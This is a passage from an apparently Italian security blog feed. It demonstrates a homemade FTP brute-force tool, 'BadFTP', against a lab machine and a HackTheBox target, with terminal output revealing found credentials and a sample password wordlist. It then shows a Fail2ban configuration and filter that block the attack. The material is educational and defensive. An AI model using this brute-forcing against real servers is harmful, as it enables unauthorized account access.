&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Cosa differenzia BadFTP dallo script presente nel post che vi ho menzionato sopra? Proprio il fatto che BadFTP è &lt;code&gt;modulabile&lt;/code&gt;. Lo script infatti verifica se il server FTP remoto è configurato in modo errato per poter permetter l&amp;rsquo;accesso come anonymous, in caso positivo, elenca i file presenti sul server FTP, in caso negativo tenta di fare il brute forcing.&lt;/p&gt;
&lt;p&gt;Essendo che noi non sappiamo se il nostro server target sia a priori vulnerabile o meno, dobbiamo in ogni caso passargli le wordlist richieste, cosi facendo, se il server non permette l&amp;rsquo;accesso come anonymous, BadFTP tenta il brute force.&lt;/p&gt;
&lt;p&gt;Vediamo lo script in opera, ho configurato una macchina Ubuntu con utente e password, analizziamo il comportamento di BadFTP:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/ftp-brute&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ python3 ftp-brute.py 
                    
     _____       _ _____ _____ _____ 
    | __  |___ _| |   __|_   _|  _  |
    | __ -| .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;| . |   __| | | |   __|
    |_____|__,|___|__|    |_| |__|   
                                 
        
Usage: python3 script.py ftp_server_ip_address username wordlist_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Se non forniamo nessun parametro lo script ci informerà dei valori che necessita per funzionare correttamente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/ftp-brute&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt
                    
     _____       _ _____ _____ _____ 
    | __  |___ _| |   __|_   _|  _  |
    | __ -| .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;| . |   __| | | |   __|
    |_____|__,|___|__|    |_| |__|   
                                 
        

The FTP server at &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; 192.168.1.77 &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; does not allow anonymous access or is unreachable.

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Passwords to try: &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying dog
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying password
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying cat
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying beverly3cat
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying beverly3
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying cat
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying cat
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying VTXrumVvszNh8y5z
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying wordpress
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying dog339000
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying wordpress

------------------------------
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found credentials: 
        Host: 192.168.1.77
        User: paul
        Password: dog339000
------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come vediamo, per far funzionare BadFTP, è necessario conoscere i nomi utenti presenti sul server FTP, infatti &lt;em&gt;il bruteforcing avviene solo sulla password dell&amp;rsquo;utente specificato, in questo caso l&amp;rsquo;utente &lt;strong&gt;paul&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Come possiamo vedere, lo script ci ha trovato correttamente la password, che in questo caso è &lt;code&gt;dog339000&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Proviamo ora a usare lo script su una macchina che constente l&amp;rsquo;accesso come anonymous, a tale fine, useremo la macchina &lt;code&gt;Crocodile&lt;/code&gt; di HackTheBox, essa fa parte del percorso &lt;strong&gt;Starting Poing&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/ftp-brute&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ python3 ftp-brute.py 10.129.224.108 paul wordlist.txt
                    
     _____       _ _____ _____ _____ 
    | __  |___ _| |   __|_   _|  _  |
    | __ -| .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;| . |   __| | | |   __|
    |_____|__,|___|__|    |_| |__|   
                                 
        

The FTP server at &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; 10.129.224.108 &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; allows anonymous access.

------------------------------

Contents of the root directory:

allowed.userlist
allowed.userlist.passwd

------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso la macchina consente l&amp;rsquo;accesso come anonymous, ed elenca i file presenti.&lt;/p&gt;
&lt;p&gt;In entrambe le scansioni abbiamo usato una wordlist di test che ho creato personalmente, che è:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;wordlist.txt:&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dog
cat
admin
wordpress
cat
admin
wordpress
password
myadmin
beverly3
password
cat
admin
wordpress
password
myadmin
beverly3
myadmin
cat
admin
cat
admin
wordpress
password
myadmin
beverly3cat
admin
wordpress
password
myadmin
beverly3cat
admin
wordpress
password
myadmin
beverly3
wordpress
password
myadmin
beverly3
beverly3
VTXrumVvszNh8y5z
dog339000
home
google
apple
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;introduzione-a-fail2ban&#34;&gt;Introduzione a Fail2ban&lt;/h1&gt;
&lt;p&gt;Abbiamo abbondantemente visto come poter attaccare il protocollo FTP per trovare le credenziali, ma oltre ad attaccare un servizio è utile sapere anche come diferlo, ed ecco che viene in nostro aiuto fail2ban.&lt;/p&gt;
&lt;h2 id=&#34;cosè-fail2ban&#34;&gt;Cos&amp;rsquo;è Fail2ban&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Fail2ban&lt;/code&gt; è un&amp;rsquo;applicazione open source utilizzata per migliorare la sicurezza di un sistema Linux proteggendolo da attacchi di forza bruta e altri tipi di attacchi informatici. Il concetto di base di Fail2ban è monitorare i file di log del sistema per rilevare tentativi di accesso falliti e poi bloccare automaticamente gli indirizzi IP degli aggressori che effettuano tali tentativi ripetutamente. Questo aiuta a proteggere il tuo server da tentativi di accesso non autorizzati.&lt;/p&gt;
&lt;p&gt;Per installare &lt;code&gt;Fail2ban&lt;/code&gt; usiamo il seguente comando per distro basate su Debian:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt-get install fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Su una distribuzione basata su CentOS/RHEL, puoi usare:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum install fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La configurazione di Fail2ban è basata su file di configurazione. Il file principale di configurazione di Fail2ban è solitamente &lt;code&gt;/etc/fail2ban/jail.conf&lt;/code&gt; o &lt;code&gt;/etc/fail2ban/jail.local&lt;/code&gt;. Tuttavia, è una buona pratica creare un file personalizzato chiamato &lt;code&gt;/etc/fail2ban/jail.d/custom.conf&lt;/code&gt; per evitare di sovrascrivere le impostazioni predefinite.&lt;/p&gt;
&lt;p&gt;Puoi creare un file &lt;code&gt;/etc/fail2ban/jail.d/vsftpd.conf&lt;/code&gt; per configurare Fail2ban specificamente per vsftpd. Ecco un esempio di configurazione per il servizio vsftpd:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;vsftpd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
enabled &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; true
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vsftpd
logpath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; /var/log/vsftpd.log
maxretry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
bantime &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo esempio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;enabled = true abilita la regola per vsftpd.&lt;/li&gt;
&lt;li&gt;port = 21 specifica la porta utilizzata da vsftpd (21 è la porta FTP predefinita).&lt;/li&gt;
&lt;li&gt;filter = vsftpd indica il filtro da utilizzare, che è configurato in un altro file.&lt;/li&gt;
&lt;li&gt;logpath = /var/log/vsftpd.log specifica il percorso del file di log di vsftpd.&lt;/li&gt;
&lt;li&gt;maxretry = 3 definisce il numero massimo di tentativi di accesso falliti prima che Fail2ban blocchi l&amp;rsquo;indirizzo IP.&lt;/li&gt;
&lt;li&gt;bantime = 3600 specifica il tempo in cui l&amp;rsquo;indirizzo IP viene bloccato in secondi (in questo caso, 3600 secondi, ovvero 1 ora).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il filtro predefinito per il protocollo FTP si trova nella path: &lt;code&gt;/etc/fail2ban/filter.d/vsftpd.conf&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Fail2Ban filter for vsftp&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Configure VSFTP for &amp;#34;dual_log_enable=YES&amp;#34;, and have fail2ban watch&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# /var/log/vsftpd.log instead of /var/log/secure. vsftpd.log file shows the&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# incoming ip address rather than domain names.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INCLUDES&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

before &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; common.conf

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Definition&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

__pam_re&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\(&lt;/span&gt;?%&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;__pam_auth&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;?:&lt;span style=&#34;color:#ae81ff&#34;&gt;\(\S&lt;/span&gt;+&lt;span style=&#34;color:#ae81ff&#34;&gt;\)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;?&lt;span style=&#34;color:#ae81ff&#34;&gt;\)&lt;/span&gt;?:?
_daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  vsftpd

failregex &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ^%&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;__prefix_line&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;s%&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;__pam_re&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;s&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;+authentication failure; logname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;* uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;* euid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;* tty&lt;span style=&#34;color:#f92672&#34;&gt;=(&lt;/span&gt;ftp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;? ruser&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;* rhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;HOST&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;?:&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;+user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;.*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;?&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;*$
            ^ &lt;span style=&#34;color:#ae81ff&#34;&gt;\[&lt;/span&gt;pid &lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;+&lt;span style=&#34;color:#ae81ff&#34;&gt;\]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;^&lt;span style=&#34;color:#ae81ff&#34;&gt;\]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;+&lt;span style=&#34;color:#ae81ff&#34;&gt;\]&lt;/span&gt; FAIL LOGIN: Client &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;HOST&amp;gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;?:&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;*$|,&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

ignoreregex &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 

&lt;span style=&#34;color:#75715e&#34;&gt;# Author: Cyril Jaquier&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Documentation from fail2ban wiki&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dopo aver configurato Fail2ban e il filtro vsftpd, riavvia il servizio per applicare le modifiche:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo service fail2ban restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In alcuni casi può essere necessario anche avviare il servizio fail2ban, per farlo usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo service fail2ban start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora, proviamo ad eseguire di nuovo BadFTP e vediamo cosa accade:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/ftp-brute&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt 
                    
     _____       _ _____ _____ _____ 
    | __  |___ _| |   __|_   _|  _  |
    | __ -| .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;| . |   __| | | |   __|
    |_____|__,|___|__|    |_| |__|   
                                 
        

The FTP server at &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; 192.168.1.77 &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; does not allow anonymous access or is unreachable.

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Passwords to try: &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying dog
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying password
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying catException in thread Thread-2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;password_checker&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
Traceback &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;most recent call last&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/threading.py&amp;#34;&lt;/span&gt;, line 1038, in _bootstrap_inner
    self.run&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/threading.py&amp;#34;&lt;/span&gt;, line 975, in run
    self._target&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*self._args, **self._kwargs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&amp;#34;&lt;/span&gt;, line 63, in password_checker
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;username, password&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&amp;#34;&lt;/span&gt;, line 36, in is_correct
    server.connect&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/ftplib.py&amp;#34;&lt;/span&gt;, line 158, in connect
    self.sock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket.create_connection&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;self.host, self.port&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, self.timeout,
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/socket.py&amp;#34;&lt;/span&gt;, line 851, in create_connection
    raise exceptions&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/socket.py&amp;#34;&lt;/span&gt;, line 836, in create_connection
    sock.connect&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sa&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
ConnectionRefusedError: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
Exception in thread Thread-1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;password_checker&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
Traceback &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;most recent call last&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/threading.py&amp;#34;&lt;/span&gt;, line 1038, in _bootstrap_inner
    self.run&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/threading.py&amp;#34;&lt;/span&gt;, line 975, in run
    self._target&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*self._args, **self._kwargs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&amp;#34;&lt;/span&gt;, line 63, in password_checker
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;username, password&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&amp;#34;&lt;/span&gt;, line 36, in is_correct
    server.connect&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/ftplib.py&amp;#34;&lt;/span&gt;, line 158, in connect
    self.sock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket.create_connection&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;self.host, self.port&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, self.timeout,
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/socket.py&amp;#34;&lt;/span&gt;, line 851, in create_connection
    raise exceptions&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/python3.11/socket.py&amp;#34;&lt;/span&gt;, line 836, in create_connection
    sock.connect&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sa&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
ConnectionRefusedError: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come possiamo notare, veniamo bloccati da fail2ban, disattivandolo con:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo service fail2ban stop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Saremo di nuovo in grado di utilizzare lo script. Nella cybersecurity è fondamentale capire sia come sfruttare vulnerabilità dei sistemi, dei protocolli di rete o in snippet di codice che fanno parte di un software, ma è altrettanto fondamentale capire come difendere questi sistemi.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Brute Force di un Server FTP</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</guid>
      <description>Table Of Contents:
